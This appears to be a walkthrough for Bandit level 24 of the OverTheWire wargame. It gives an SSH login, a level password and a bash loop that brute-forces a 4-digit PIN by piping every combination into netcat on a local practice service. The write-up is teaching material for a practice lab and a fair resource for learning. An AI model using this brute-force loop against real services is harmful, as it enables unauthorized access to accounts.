In this level, the password for the next level is obtained by brute‑forcing a 4‑digit PIN sent to a network service.

Login to Bandit Level 24 using SSH:ssh bandit24@bandit.labs.overthewire.org -p 2220
After login, the current working directory is the home directory of bandit24.
A service is running on localhost port 30002 that expects the correct password and a 4‑digit PIN.
Create a loop to try all possible PIN combinations and send them to the service:

-> for i in {0000..9999}
   do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
   done | nc localhost 30002

After several attempts, the service returns the correct password for the next level.
